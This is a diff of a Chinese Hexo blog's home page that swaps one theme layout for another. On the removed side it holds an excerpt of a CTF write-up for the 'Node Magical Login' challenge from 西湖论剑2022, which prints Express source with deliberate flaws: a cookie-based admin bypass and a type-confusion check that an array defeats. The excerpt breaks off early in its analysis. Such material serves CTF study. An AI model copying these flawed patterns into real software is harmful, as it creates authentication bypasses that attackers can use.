@@ -1,1640 +1,467 @@
+
 <!DOCTYPE html>
 <html lang="zh-CN">
-<head>
-  <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
-<meta name="theme-color" content="#222">
-<meta name="generator" content="Hexo 6.3.0">
-  <link rel="apple-touch-icon" sizes="180x180" href="/blog/images/apple-touch-icon-next.png">
-  <link rel="icon" type="image/png" sizes="32x32" href="/blog/images/favicon-32x32-next.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="/blog/images/favicon-16x16-next.png">
-  <link rel="mask-icon" href="/blog/images/logo.svg" color="#222">
+    <head>
+        <meta charset="UTF-8" />
+        <title>Blog,from C1oudFLowing</title>
+        <meta name="author" content="CloudFlowing" />
+        <meta name="description" content="" />
+        <meta name="keywords" content="" />
+        <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" />
+        <link rel="icon" href="/blog/images/croppedImage_cropped.jpg" />
+        <script src="https://cdn.staticfile.org/vue/3.2.45/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.2.1/css/all.min.css" />
+<link rel="stylesheet" href="/blog/css/fonts.min.css" />
+<script> const mixins = {}; </script>
 
-<link rel="stylesheet" href="/blog/css/main.css">
-
-
-<link rel="stylesheet" href="/blog/lib/font-awesome/css/all.min.css">
-
-<script id="hexo-configurations">
-    var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"c1oudflowing.github.io","root":"/blog/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
-  </script>
-
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Blog,from C1oudFLowing">
-<meta property="og:url" content="http://c1oudflowing.github.io/blog/index.html">
-<meta property="og:site_name" content="Blog,from C1oudFLowing">
-<meta property="og:locale" content="zh_CN">
-<meta property="article:author" content="CloudFlowing">
-<meta name="twitter:card" content="summary">
-
-<link rel="canonical" href="http://c1oudflowing.github.io/blog/">
+<script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>
 
 
-<script id="page-configurations">
-  // https://hexo.io/docs/variables.html
-  CONFIG.page = {
-    sidebar: "",
-    isHome : true,
-    isPost : false,
-    lang   : 'zh-CN'
-  };
-</script>
+<script src="https://cdn.staticfile.org/highlight.js/11.7.0/highlight.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://cdn.staticfile.org/highlight.js/11.7.0/styles/github.min.css"
+/>
+<script src="/blog/js/lib/highlight.js"></script>
 
-  <title>Blog,from C1oudFLowing</title>
-  
+
+
+<script src="/blog/js/lib/preview.js"></script>
 
 
 
 
 
+<script src="/blog/js/lib/home.js"></script>
 
-  <noscript>
-  <style>
-  .use-motion .brand,
-  .use-motion .menu-item,
-  .sidebar-inner,
-  .use-motion .post-block,
-  .use-motion .pagination,
-  .use-motion .comments,
-  .use-motion .post-header,
-  .use-motion .post-body,
-  .use-motion .collection-header { opacity: initial; }
+<link rel="stylesheet" href="/blog/css/main.css" />
 
-  .use-motion .site-title,
-  .use-motion .site-subtitle {
-    opacity: initial;
-    top: initial;
-  }
-
-  .use-motion .logo-line-before i { left: initial; }
-  .use-motion .logo-line-after i { right: initial; }
-  </style>
-</noscript>
-
-
-</head>
-
-
-<body itemscope itemtype="http://schema.org/WebPage">
-  <div class="container use-motion">
-    <div class="headband"></div>
-
-    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-container">
-  <div class="site-nav-toggle">
-    <div class="toggle" aria-label="切换导航栏">
-      <span class="toggle-line toggle-line-first"></span>
-      <span class="toggle-line toggle-line-middle"></span>
-      <span class="toggle-line toggle-line-last"></span>
+    <meta name="generator" content="Hexo 6.3.0"></head>
+    <body>
+        <div id="layout">
+            <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存&ensp;浏览器默认开启</p>
+                    <img src="/blog/images/loading.gif" />
+                </div>
+            </div>
+            </transition>
+            <transition name="into">
+            <div id="main" v-show="!loading">
+                <nav id="menu" ref="menu">
+    <div class="desktop-menu">
+        <a class="title" href="/blog/">
+            <span>BLOG,FROM C1OUDFLOWING</span>
+        </a>
+        
+        <a href="/blog/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/blog/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/blog/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/blog/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/blog/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
     </div>
-  </div>
-
-  <div class="site-meta">
-
-    <a href="/blog/" class="brand" rel="start">
-      <span class="logo-line-before"><i></i></span>
-      <h1 class="site-title">Blog,from C1oudFLowing</h1>
-      <span class="logo-line-after"><i></i></span>
-    </a>
-      <p class="site-subtitle" itemprop="description">基于hexo+next主题框架</p>
-  </div>
-
-  <div class="site-nav-right">
-    <div class="toggle popup-trigger">
+    <div id="mobile-menu">
+        <div class="curtain" v-show="showMenu" @click="showMenu = !showMenu"></div>
+        <div class="title" @click="showMenu = !showMenu">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;BLOG,FROM C1OUDFLOWING</span>
+        </div>
+        <transition name="slide">
+        <div class="items" v-show="showMenu">
+            
+            <a href="/blog/">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-house fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                </div>
+            </a>
+            
+            <a href="/blog/about">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-id-card fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                </div>
+            </a>
+            
+            <a href="/blog/archives">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-box-archive fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                </div>
+            </a>
+            
+            <a href="/blog/categories">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-bookmark fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                </div>
+            </a>
+            
+            <a href="/blog/tags">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-tags fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                </div>
+            </a>
+            
+        </div>
+        </transition>
     </div>
-  </div>
-</div>
-
-
-
-
-<nav class="site-nav">
-  <ul id="menu" class="main-menu menu">
-        <li class="menu-item menu-item-home">
-
-    <a href="/blog/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
-
-  </li>
-        <li class="menu-item menu-item-archives">
-
-    <a href="/blog/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
-
-  </li>
-  </ul>
 </nav>
 
-
-
-
+                <div id="home-head">
+    <div id="home-background" ref="homeBackground" data-image="/blog/images/dcep12_pc.png"></div>
+    
+    <div id="home-info" @click="homeClick">
+        <span class="loop"></span>
+        <span class="loop"></span>
+        <span class="loop"></span>
+        <span class="loop"></span>
+        <span class="info">
+            <div class="wrap">
+                <h1>Blog,from C1oudFLowing</h1>
+                <h3>基于hexo+particlex主题框架</h3>
+                <h5></h5>
+            </div>
+        </span>
+    </div>
+    
 </div>
-    </header>
-
-    
-  <div class="back-to-top">
-    <i class="fa fa-arrow-up"></i>
-    <span>0%</span>
-  </div>
-
-
-    <main class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          
-
-          <div class="content index posts-expand">
+<div id="home-posts-wrap"  ref="homePostsWrap">
+    <div id="home-posts">
+        <div id="posts">
             
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://c1oudflowing.github.io/blog/2023/03/02/Forestwolf/">
 
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/blog/images/avatar.gif">
-      <meta itemprop="name" content="CloudFlowing">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Blog,from C1oudFLowing">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/blog/2023/03/02/Forestwolf/" class="post-title-link" itemprop="url">Forestwolf</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2023-03-02 19:34:43 / 修改时间：20:46:51" itemprop="dateCreated datePublished" datetime="2023-03-02T19:34:43+08:00">2023-03-02</time>
+<div class="post">
+    <a href="/blog/2023/03/02/Forestwolf/">
+        <h2 class="post-title">Forestwolf</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
             </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p><img src="/blog/2023/03/02/Forestwolf/1.png" alt="1"></p>
+            2023/3/2
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <p><img src="/blog/2023/03/02/Forestwolf/1.png" alt="1"></p>
 <h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1>
-      
+            
+        </div>
     </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        <span class="tag">
+            
+            <a href="/blog/tags/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/" style="color: #00a596">
+                CTF线上赛
+            </a>
+        </span>
+        
+    </div>
+    <a href="/blog/2023/03/02/Forestwolf/" class="go-post">阅读全文</a>
+</div>
 
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://c1oudflowing.github.io/blog/2023/03/01/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/blog/images/avatar.gif">
-      <meta itemprop="name" content="CloudFlowing">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Blog,from C1oudFLowing">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/blog/2023/03/01/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022/" class="post-title-link" itemprop="url">西湖论剑2022</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2023-03-01 17:13:35" itemprop="dateCreated datePublished" datetime="2023-03-01T17:13:35+08:00">2023-03-01</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
+<div class="post">
+    <a href="/blog/2023/03/01/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022/">
+        <h2 class="post-title">西湖论剑2022</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="category">
+            <a href="/blog/categories/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
                 </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-03-02 20:32:54" itemprop="dateModified" datetime="2023-03-02T20:32:54+08:00">2023-03-02</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="Node-Magical-Login"><a href="#Node-Magical-Login" class="headerlink" title="Node Magical Login"></a>Node Magical Login</h1><h2 id="主界面"><a href="#主界面" class="headerlink" title="主界面"></a>主界面</h2><p><img src="/blog/2023/03/01/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022/1.png" alt="1"></p>
-<p>一个nodejs登录界面</p>
-<h2 id="源码附件"><a href="#源码附件" class="headerlink" title="源码附件"></a>源码附件</h2><h3 id="main-js"><a href="#main-js" class="headerlink" title="main.js"></a>main.js</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>)</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>)</span><br><span class="line"><span class="keyword">const</span> cookieParser = <span class="built_in">require</span>(<span class="string">&quot;cookie-parser&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> controller = <span class="built_in">require</span>(<span class="string">&quot;./controller&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">PORT</span> = <span class="title class_">Number</span>(process.<span class="property">env</span>.<span class="property">PORT</span>) || <span class="number">80</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">HOST</span> = <span class="string">&#x27;0.0.0.0&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">urlencoded</span>(&#123;<span class="attr">extended</span>:<span class="literal">false</span>&#125;))</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">cookieParser</span>())</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>())</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(<span class="string">&#x27;static&#x27;</span>))</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/login&quot;</span>,<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    controller.<span class="title class_">LoginController</span>(req,res)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/&quot;</span>,<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">sendFile</span>(__dirname,<span class="string">&quot;static/index.html&quot;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/flag1&quot;</span>,<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    controller.<span class="title class_">Flag1Controller</span>(req,res)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/flag2&quot;</span>,<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    controller.<span class="title class_">CheckInternalController</span>(req,res)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/getflag2&quot;</span>,<span class="function">(<span class="params">req,res</span>)=&gt;</span> &#123;</span><br><span class="line">    controller.<span class="title class_">CheckController</span>(req,res)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="variable constant_">PORT</span>,<span class="variable constant_">HOST</span>,<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Server is listening on Host <span class="subst">$&#123;HOST&#125;</span> Port <span class="subst">$&#123;PORT&#125;</span>.`</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
-
-<h3 id="controller-js"><a href="#controller-js" class="headerlink" title="controller.js"></a>controller.js</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">SECRET_COOKIE</span> = process.<span class="property">env</span>.<span class="property">SECRET_COOKIE</span> || <span class="string">&quot;this_is_testing_cookie&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> flag1 = fs.<span class="title function_">readFileSync</span>(<span class="string">&quot;/flag1&quot;</span>)</span><br><span class="line"><span class="keyword">const</span> flag2 = fs.<span class="title function_">readFileSync</span>(<span class="string">&quot;/flag2&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">LoginController</span>(<span class="params">req,res</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> username = req.<span class="property">body</span>.<span class="property">username</span></span><br><span class="line">        <span class="keyword">const</span> password = req.<span class="property">body</span>.<span class="property">password</span></span><br><span class="line">        <span class="keyword">if</span> (username !== <span class="string">&quot;admin&quot;</span> || password !== <span class="title class_">Math</span>.<span class="title function_">random</span>().<span class="title function_">toString</span>()) &#123;</span><br><span class="line">            res.<span class="title function_">status</span>(<span class="number">401</span>).<span class="title function_">type</span>(<span class="string">&quot;text/html&quot;</span>).<span class="title function_">send</span>(<span class="string">&quot;Login Failed&quot;</span>)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.<span class="title function_">cookie</span>(<span class="string">&quot;user&quot;</span>,<span class="variable constant_">SECRET_COOKIE</span>)</span><br><span class="line">            res.<span class="title function_">redirect</span>(<span class="string">&quot;/flag1&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (__) &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">CheckInternalController</span>(<span class="params">req,res</span>) &#123;</span><br><span class="line">    res.<span class="title function_">sendFile</span>(<span class="string">&quot;check.html&quot;</span>,&#123;<span class="attr">root</span>:<span class="string">&quot;static&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">CheckController</span>(<span class="params">req,res</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> checkcode = req.<span class="property">body</span>.<span class="property">checkcode</span>?req.<span class="property">body</span>.<span class="property">checkcode</span>:<span class="number">1234</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">body</span>)</span><br><span class="line">    <span class="keyword">if</span>(checkcode.<span class="property">length</span> === <span class="number">16</span>)&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            checkcode = checkcode.<span class="title function_">toLowerCase</span>()<span class="comment">//被转成小写，但是这个处理不了数组格式</span></span><br><span class="line">            <span class="keyword">if</span>(checkcode !== <span class="string">&quot;aGr5AtSp55dRacer&quot;</span>)&#123;</span><br><span class="line">                res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">json</span>(&#123;<span class="string">&quot;msg&quot;</span>:<span class="string">&quot;Invalid Checkcode1:&quot;</span> + checkcode&#125;)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (__) &#123;&#125;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">type</span>(<span class="string">&quot;text/html&quot;</span>).<span class="title function_">json</span>(&#123;<span class="string">&quot;msg&quot;</span>:<span class="string">&quot;You Got Another Part Of Flag: &quot;</span> + flag2.<span class="title function_">toString</span>().<span class="title function_">trim</span>()&#125;)</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">type</span>(<span class="string">&quot;text/html&quot;</span>).<span class="title function_">json</span>(&#123;<span class="string">&quot;msg&quot;</span>:<span class="string">&quot;Invalid Checkcode2:&quot;</span> + checkcode&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Flag1Controller</span>(<span class="params">req,res</span>)&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(req.<span class="property">cookies</span>.<span class="property">user</span> === <span class="variable constant_">SECRET_COOKIE</span>)&#123;</span><br><span class="line">            res.<span class="title function_">setHeader</span>(<span class="string">&quot;This_Is_The_Flag1&quot;</span>,flag1.<span class="title function_">toString</span>().<span class="title function_">trim</span>())</span><br><span class="line">            res.<span class="title function_">setHeader</span>(<span class="string">&quot;This_Is_The_Flag2&quot;</span>,flag2.<span class="title function_">toString</span>().<span class="title function_">trim</span>())</span><br><span class="line">            res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">type</span>(<span class="string">&quot;text/html&quot;</span>).<span class="title function_">send</span>(<span class="string">&quot;Login success. Welcome,admin!&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(req.<span class="property">cookies</span>.<span class="property">user</span> === <span class="string">&quot;admin&quot;</span>) &#123;</span><br><span class="line">            res.<span class="title function_">setHeader</span>(<span class="string">&quot;This_Is_The_Flag1&quot;</span>, flag1.<span class="title function_">toString</span>().<span class="title function_">trim</span>())</span><br><span class="line">            res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">type</span>(<span class="string">&quot;text/html&quot;</span>).<span class="title function_">send</span>(<span class="string">&quot;You Got One Part Of Flag! Try To Get Another Part of Flag!&quot;</span>)</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            res.<span class="title function_">status</span>(<span class="number">401</span>).<span class="title function_">type</span>(<span class="string">&quot;text/html&quot;</span>).<span class="title function_">send</span>(<span class="string">&quot;Unauthorized&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">catch</span> (__) &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">    <span class="title class_">LoginController</span>,</span><br><span class="line">    <span class="title class_">CheckInternalController</span>,</span><br><span class="line">    <span class="title class_">Flag1Controller</span>,</span><br><span class="line">    <span class="title class_">CheckController</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<hr>
-<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><ul>
-<li><p>先看获取flag的条件</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/flag1&quot;</span>,<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    controller.<span class="title class_">Flag1Controller</span>(req,res)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/flag2&quot;</span>,<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    controller.<span class="title class_">CheckInternalController</span>(req,res)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/getflag2&quot;</span>,<span class="function">(<span class="params">req,res</span>)=&gt;</span> &#123;</span><br><span class="line">    controller.<span class="title class_">CheckController</span>(req,res)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
-
-<p><strong>main.js</strong>指向<strong>controller.js</strong>中的几个方法</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">LoginController</span>(<span class="params">req,res</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> username = req.<span class="property">body</span>.<span class="property">username</span></span><br><span class="line">        <span class="keyword">const</span> password = req.<span class="property">body</span>.<span class="property">password</span></span><br><span class="line">        <span class="keyword">if</span> (username !== <span class="string">&quot;admin&quot;</span> || password !== <span class="title class_">Math</span>.<span class="title function_">random</span>().<span class="title function_">toString</span>()) &#123;</span><br><span class="line">            res.<span class="title function_">status</span>(<span class="number">401</span>).<span class="title function_">type</span>(<span class="string">&quot;text/html&quot;</span>).<span class="title function_">send</span>(<span class="string">&quot;Login Failed&quot;</span>)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.<span class="title function_">cookie</span>(<span class="string">&quot;user&quot;</span>,<span class="variable constant_">SECRET_COOKIE</span>)</span><br><span class="line">            res.<span class="title function_">redirect</span>(<span class="string">&quot;/flag1&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (__) &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">------------------------------------------------</span><br><span class="line"></span><br><span class="line"><span 